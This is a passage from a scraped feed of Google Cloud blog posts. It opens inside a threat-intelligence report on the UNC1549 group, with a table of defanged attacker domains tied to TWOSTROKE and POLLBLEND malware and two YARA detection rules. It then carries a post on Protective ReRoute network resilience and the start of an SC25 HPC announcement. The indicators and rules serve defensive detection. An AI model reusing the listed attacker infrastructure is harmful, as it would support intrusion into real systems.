16px;\">\n<p><span style=\"vertical-align: baseline;\">snare-core.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">storageboxcloud.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">storagewiz.co.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">swiftcode.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">swifttiniventures.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">terratechworld.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thecloudappbox.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thestorageboxcloud.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thetacticstore[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thevaultapp.westus3.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thevaultspace.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">tini-ventures[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vcphone-ms.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vcs-news[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vm-ticket-svc.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vm-tools-svc.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vmware-health-ms.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Rules</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>import \"pe\"\n\nrule M_APT_Utility_DCSYNCER_SLICK_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\t\tmd5 = \"10f16991665df69d1ccd5187e027cf3d\"\n\tstrings:\n\t\t$ = { 48 89 84 24 ?? 01 00 00 C7 84 24 ?? 01 00 00 30 80 28 00 C7 84 24 ?? 01 00 00 E8 03 00 00 48 C7 84 24 ?? 01 00 00 00 00 A0 00 BA ?? 00 00 00 8D 4A ?? FF 15 ?? ?? 01 00 48 89 84 24 ?? 01 00 00 C7 00 01 00 00 00 48 8B 84 24 ?? 01 00 00 44 89 ?? 04 48 8B 84 24 ?? 01 00 00 C7 40 08 ?? 00 00 00 41 8B ?? }\n\t\t$ = \"\\\\LOG.txt\" ascii wide\n\t\t$ = \"%ws_%d:%d:\" ascii wide fullword\n\t\t$ = \"%ws:%d:\" ascii wide fullword\n\t\t$ = \"::::\" ascii wide fullword\n\t\t$ = \"%ws_%d:%d::\" ascii wide fullword\n\t\t$ = \"%ws:%d::\" ascii wide fullword\n\tcondition:\n\t\tpe.is_pe and all of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>import \"pe\"\n\nrule M_APT_Utility_CRASHPAD_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\t\tmd5 = \"b2bd275f97cb95c7399065b57f90bb6c\"\n\tstrings:\n\t\t$ = \"[-] Loo ror: %u\" ascii fullword\n\t\t$ = \"[-] Adj r: %u\" ascii fullword\n\t\t$ = \"[-] Th ge. \" ascii fullword\n\t\t$ = \"[+] O s!\" ascii fullword\n\t\t$ = \"[-] O C: %i\" ascii fullword\n\t\t$ = \"[-] O E: %i\" ascii fullword\n\t\t$ = \"[+] Op cess!\" ascii fullword\n\t\t$ = \"[-] Op Code: %i\" ascii fullword\n\t\t$ = \"[-] O Error: %i\" ascii fullword\n\t\t$ = \"[+] Im su!\" ascii fullword\n\t\t$ = \"[+] R\" ascii fullword\n\t\t$ = \"[-] Impe Code: %i\" ascii fullword\n\t\t$ = \"[-] Imo: %i\" ascii fullword\n\t\t$ = \"[+] Du success!\" ascii fullword\n\t\t$ = \"[-] Du Code: %i\" ascii fullword\n\t\t$ = \"[-] Du Error: %i\" ascii fullword\n\t\t$ = \"[+] Dec Suc.\" ascii fullword\n\t\t$ = \"%02X\" ascii fullword\n\t\t$ = \"Decryption failed\" ascii fullword\n\t\t$ = \"config.txt\"\n\t\t$ = \"crash.log\"\n\t\t$ = \"[+] e wt!\" ascii fullword\n\t\t$ = \"[+] p %d!\" ascii fullword\n\t\t$ = \"[+] e!\" ascii fullword\n\tcondition:\n\t\tpe.is_pe and 15 of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Google Security Operations Detections</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google SecOps customers receive robust detection for UNC1549 TTPs through curated threat intelligence from Mandiant and Google Threat Intelligence. This frontline intelligence is operationalized within the platform as custom detection signatures and advanced YARA-L rules.</span></p></div>",
        "published_date": "2025-11-17 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/how-protective-reroute-improves-network-resilience/",
        "title": "Google Cloud Networking under the hood: How Protective ReRoute increases resilience",
        "thumbnail": null,
        "author": "Yaogong Wang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Cloud infrastructure reliability is foundational, yet even the most sophisticated global networks can suffer from a critical issue: </span><strong style=\"vertical-align: baseline;\">slow or failed recovery from routing outages.</strong><span style=\"vertical-align: baseline;\"> In massive, planetary-scale networks like Google's, router failures or complex, hidden conditions can prevent traditional routing protocols from restoring service quickly, or sometimes at all. These brief but costly outages \u2014 what we call </span><strong style=\"vertical-align: baseline;\">slow convergence</strong><span style=\"vertical-align: baseline;\"> or </span><strong style=\"vertical-align: baseline;\">convergence failure </strong><span style=\"vertical-align: baseline;\">\u2014 critically disrupt real-time applications with low tolerance to packet loss and, most acutely, today's massive, sensitive AI/ML training jobs, where a brief network hiccup can waste millions of dollars in compute time.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">To solve this problem, we pioneered </span><strong style=\"vertical-align: baseline;\">Protective ReRoute (PRR)</strong><span style=\"vertical-align: baseline;\">, a radical shift that moves the responsibility for rapid failure recovery from the centralized network core to the distributed endpoints themselves. Since putting it into production over five years ago, this host-based mechanism has dramatically increased Google\u2019s network's resilience, proving effective in recovering from up to </span><strong style=\"vertical-align: baseline;\">84%</strong><span style=\"vertical-align: baseline;\"><sup>1</sup> of inter-data-center outages that would have been caused by slow convergence events. Google Cloud customers with workloads that are sensitive to packet loss can also enable it in their environments \u2014 read on to learn more.\u00a0\u00a0\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The limits of in-network recovery</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Traditional routing protocols are essential for network operation, but they are often not fast enough to meet the demands of modern, real-time workloads. When a router or link fails, the network must recalculate all affected routes, which is known as </span><strong style=\"vertical-align: baseline;\">reconvergence</strong><span style=\"vertical-align: baseline;\">. In a network the size of Google's, this process can be complicated by the scale of the topology, leading to delays that range from many seconds to minutes. For distributed AI training jobs with their wide, fan-out communication patterns, even a few seconds of packet loss can lead to application failure and costly restarts. The problem is a matter of scale: as the network grows, the likelihood of these complex failure scenarios increases.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Protective ReRoute: A host-based solution</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Protective ReRoute is a simple, effective concept: </span><strong style=\"vertical-align: baseline;\">empower the communicating endpoints (the hosts) to detect a failure and intelligently re-steer traffic to a healthy, parallel path.</strong><span style=\"vertical-align: baseline;\"> Instead of waiting for a global network update, PRR capitalizes on the rich path diversity built into our network. The host detects packet loss or high latency on its current path, and then immediately initiates a path change by modifying carefully chosen packet header fields, which tells the network to use an alternate, pre-existing path.</span></p>\n<p><span style=\"vertical-align: baseline;\">This architecture represents a fundamental shift in network reliability thinking. Traditional networks rely on a combination of parallel and </span><strong style=\"vertical-align: baseline;\">series reliability</strong><span style=\"vertical-align: baseline;\">. Serialization of components tends to reduce the reliability of a system; in a large-diameter network with multiple forwarding stages, reliability degrades as the diameter increases. In other words, every forwarding stage affects the whole system. Even if a network stage is designed with parallel reliability, it creates a serial impact on the overall network while the parallel stage reconverges. By adding PRR at the edges, we treat the network as a </span><strong style=\"vertical-align: baseline;\">highly parallel system of paths that appear as a single stage</strong><span style=\"vertical-align: baseline;\">, where the overall reliability increases as the number of available paths grows exponentially, effectively circumventing the serialization effects of slow network convergence in a large-diameter network. The following diagram contrasts the system reliability model for a PRR-enabled network with that of a traditional network. Traditional network reliability is in inverse proportion to the number of forwarding stages; with PRR the reliability of the same network is in direct proportion to the number of composite paths, which is exponentially proportional to the network diameter.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1-Protective_ReRoute\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1-Protective_ReRoute.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">How Protective ReRoute works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The PRR mechanism has three core functional components:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">End-to-end failure detection:</strong><span style=\"vertical-align: baseline;\"> Communicating hosts continuously monitor path health. On Linux systems, the standard mechanism uses </span><strong style=\"vertical-align: baseline;\">TCP retransmission timeout (RTO)</strong><span style=\"vertical-align: baseline;\"> to signal a potential failure. The time to detect a failure is generally a single-digit multiple of the network's round-trip time (RTT). There are also other methods for end-to-end failure detection that have varying speed and cost.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Packet-header modification at the host:</strong><span style=\"vertical-align: baseline;\"> Once a failure is detected, the transmitting host modifies a packet-header field to influence the forwarding path. To achieve this, Google pioneered and contributed the mechanism that modifies the </span><strong style=\"vertical-align: baseline;\">IPv6 flow-label</strong><span style=\"vertical-align: baseline;\"> in the Linux kernel (version 4.20+). Crucially, the Google software-defined network (SDN) layer provides protection for </span><strong style=\"vertical-align: baseline;\">IPv4 traffic and non-Linux hosts</strong><span style=\"vertical-align: baseline;\"> as well by performing the detection and repathing on the outer headers of the network overlay.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">PRR-aware forwarding:</strong><span style=\"vertical-align: baseline;\"> Routers and switches in the multipath network respect this header modification and forward the packet onto a different, available path that bypasses the failed component.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Proof of impact</strong></h3>\n<p><span style=\"vertical-align: baseline;\">PRR is not theoretical; it is a continuously deployed, 24x7 system that protects production traffic worldwide. Its impact is compelling: PRR has been shown to reduce network downtime caused by slow convergence and convergence failures by up to the above-mentioned </span><strong style=\"vertical-align: baseline;\">84%</strong><span style=\"vertical-align: baseline;\">. This means that up to 8 out of every 10 network outages that would have been caused by a router failure or slow network-level recovery are now avoided by the host. Furthermore, host-initiated recovery is extremely fast, often resolving the problem in a single-digit multiple of the RTT, which is vastly faster than traditional network reconvergence times.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Key use cases for ultra-reliable networking</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The need for PRR is growing, driven by modern application requirements:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AI/ML training and inference:</strong><span style=\"vertical-align: baseline;\"> Large-scale workloads, particularly those </span><strong style=\"vertical-align: baseline;\">distributed across many accelerators</strong><span style=\"vertical-align: baseline;\"> (GPUs/TPUs), are uniquely sensitive to network reliability. PRR provides the ultra-reliable data distribution necessary to keep these high-value compute jobs running without disruption.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data integrity and storage:</strong><span style=\"vertical-align: baseline;\"> Significant numbers of dropped packets can result in </span><strong style=\"vertical-align: baseline;\">data corruption</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">data loss</strong><span style=\"vertical-align: baseline;\">, not just reduced throughput. By reducing the outage window, PRR improves application performance and helps guarantee data integrity.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Real-time applications:</strong><span style=\"vertical-align: baseline;\"> Applications like gaming and services like video conferencing and voice calls are intolerant of even brief connectivity outages. PRR reduces the recovery time for network failures to meet these strict real-time requirements.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Frequent short-lived connections:</strong><span style=\"vertical-align: baseline;\"> Applications that rely on a large number of very frequent short-lived connections can fail when the network is unavailable for even a short time. By reducing the expected outage window, PRR helps these applications reliably complete their required connections.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Activating Protective ReRoute for your applications</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The architectural shift to host-based reliability is an accessible technology for Google Cloud customers. The core mechanism is open and part of the mainline Linux kernel (version 4.20 and later).</span></p>\n<p><span style=\"vertical-align: baseline;\">You can benefit from PRR in two primary ways:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hypervisor mode:</strong><span style=\"vertical-align: baseline;\"> PRR automatically protects traffic running across Google data centers without requiring any guest OS changes. Hypervisor mode provides recovery in the single digit seconds for traffic of moderate fanout in specific areas of the network.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Guest mode:</strong><span style=\"vertical-align: baseline;\"> For critical, performance-sensitive applications with high fan-out and in any segment of the network, you can </span><strong style=\"vertical-align: baseline;\">opt into guest-mode PRR</strong><span style=\"vertical-align: baseline;\">, which</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">enables the fastest possible recovery time and greatest control. This is the optimal setting for demanding mission-critical applications, AI/ML jobs, and other latency-sensitive services.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To activate guest-mode PRR for critical applications follow the guidance in the </span><a href=\"https://cloud.google.com/compute/docs/networking/tcp-optimization-for-network-performance-in-gcp-and-hybrid#use-prr-for-network-resiliency\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and be ready to ensure the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Your VM runs a modern Linux kernel (4.20+).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Your applications use TCP.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The application traffic uses IPv6. For IPv4 protection, the application needs to use the gVNIC driver.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The availability of Protective ReRoute has profound implications for a variety of Google and Google Cloud users.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For cloud customers with critical workloads:</strong><span style=\"vertical-align: baseline;\"> Evaluate and enable guest-mode PRR for applications that are sensitive to packet loss and that require the fastest recovery time, such as large-scale AI/ML jobs or real-time services.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For network architects:</strong><span style=\"vertical-align: baseline;\"> Re-evaluate your network reliability architectures. Consider the benefits of designing for rich path diversity and empowering endpoints to intelligently route around failures, shifting your model from series to parallel reliability.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">For the open-source community:</strong><span style=\"vertical-align: baseline;\"> Recognize the power of host-level networking innovations. Contribute to and advocate for similar reliability features across all major operating systems to create a more resilient internet for everyone.</span></li>\n</ul>\n<hr />\n<p><sup><em><span style=\"vertical-align: baseline;\">1. <a href=\"https://dl.acm.org/doi/10.1145/3603269.3604867\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://dl.acm.org/doi/10.1145/3603269.3604867</span></a></span></em></sup></p></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/hpc/accelerating-innovation-and-discovery-at-sc25/",
        "title": "Accelerating discovery at the speed of cloud: What\u2019s New for HPC at Google Cloud for SC25",
        "thumbnail": null,
        "author": "Megan Gawlik",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With the pace of scientific discovery moving faster than ever, we\u2019re excited to join the supercomputing community as it gets ready for its annual flagship event, </span><a href=\"https://sc25.supercomputing.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SC25</span></a><span style=\"vertical-align: baseline;\">, in St. Louis from November 16-21, 2025. There, we\u2019ll share how Google Cloud is poised to help with our lineup of HPC and AI technologies and innovations, helping researchers, scientists, and engineers solve some of humanity's biggest challenges.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Redefining supercomputing with cloud-native HPC</strong></h3>\n<p><span style=\"vertical-align: baseline;\">S</span><span style=\"vertical-align: baseline;\">upercomputers are evolving from a rigid, capital-intensive resource into an adaptable, scalable service. To go from \u201cHPC in the cloud\u201d to \u201ccloud-native HPC,\u201d we leverage core principles of automation and elastic infrastructure to fundamentally change how you consume HPC resources, allowing you to spin up purpose-built clusters in minutes with the exact resources you need.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">This cloud-native model is very flexible. You can augment an on-premises cluster to meet peak demand or build a cloud-native system tailored with the right mix of hardware for your specific problem \u2014 be it the latest CPUs, GPUs, or TPUs. With this approach, we\u2019re democratizing HPC, putting world-class capabilities into the hands of startups, academics, labs, and enterprise teams alike.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">Key highlights at SC25:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Next-generation infrastructure: </strong><span style=\"vertical-align: baseline;\">We\u2019ll be showcasing our latest </span><a href=\"https://docs.cloud.google.com/compute/docs/compute-optimized-machines#h4d_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">H4D VMs</span></a><span style=\"vertical-align: baseline;\">, powered by 5th generation AMD EPYC processors and featuring Cloud RDMA for low-latency networking. You\u2019ll also see our latest accelerated compute resources including </span><a href=\"https://docs.cloud.google.com/compute/docs/accelerator-optimized-machines#a4x-vms\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A4X</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/blog/products/compute/now-shipping-a4x-max-vertex-ai-training-and-more\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A4X Max</span></a><span style=\"vertical-align: baseline;\"> VMs featuring the latest NVIDIA GPUs with RDMA.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Powering your essential applications: </strong><span style=\"vertical-align: baseline;\">Run your most demanding simulations at massive scale \u2014 from Computational Fluid Dynamics (CFD) with Ansys, to Computer-Aided Engineering with Siemens, computational chemistry with Schrodinger, and risk modeling in FSI.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Dynamic Workload Scheduler:</strong><span style=\"vertical-align: baseline;\"> Discover how </span><a href=\"https://cloud.google.com/products/dws/pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Workload Scheduler</span></a><span style=\"vertical-align: baseline;\"> and its innovative </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/dws\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Flex Start mode</span></a><span style=\"vertical-align: baseline;\">, integrated with familiar schedulers like Slurm, is reshaping HPC consumption. Move beyond static queues toward flexible, cost-effective, and efficient access to high-demand compute resources.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Easier HPC with Cluster Toolkit: </strong><span style=\"vertical-align: baseline;\">Learn how </span><a href=\"https://docs.cloud.google.com/cluster-toolkit/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cluster Toolkit</span></a><span style=\"vertical-align: baseline;\"> can help you deploy a supercomputer-scale cluster with less than 50 lines of code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">High-throughput, scalable storage:</strong><span style=\"vertical-align: baseline;\"> Get a deep dive into </span><a href=\"https://cloud.google.com/products/managed-lustre\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Managed Lustre</span></a><span style=\"vertical-align: baseline;\">, a fully managed, high-performance parallel file system that can handle your most demanding HPC and AI workloads.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hybrid for the enterprise: </strong><span style=\"vertical-align: baseline;\">For our enterprise customers, especially in financial services, we're enabling hybrid cloud with </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/ibm-symphony\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IBM Spectrum Symphony Connectors</span></a><span style=\"vertical-align: baseline;\">, allowing you to migrate or burst workloads to Google Cloud and reduce time-to-solution.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">AI-powered scientific discovery</strong></h3>\n<p><span style=\"vertical-align: baseline;\">There\u2019s a powerful synergy between HPC and AI \u2014 where HPC builds more powerful AI, and AI makes HPC faster and more insightful. This complementary relationship is fundamentally changing how research is done, accelerating discovery in everything from drug development and climate modeling to new materials and engineering. At Google Cloud, we\u2019re at the forefront of this transformation, building the models, tools, and platforms that make it possible.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">What to look for:\u00a0</strong></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">AI for scientific productivity: </strong><span style=\"vertical-align: baseline;\">We\u2019ll be showcasing Google\u2019s suite of AI tools designed to enhance the entire research lifecycle. From </span><a href=\"https://cloud.google.com/agentspace/docs/idea-generation\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Idea Generation agent</span></a><span style=\"vertical-align: baseline;\"> to </span><a href=\"https://codeassist.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\"> with </span><a href=\"https://cloud.google.com/gemini-enterprise?_gl=1*9qpvwe*_up*MQ..&amp;gclid=EAIaIQobChMIptGF-7qrkAMVRyvUAR0VwSw1EAAYASAAEgIZMPD_BwE&amp;gclsrc=aw.ds#module-7\"><span style=\"text-decoration: underline; vertical-align: 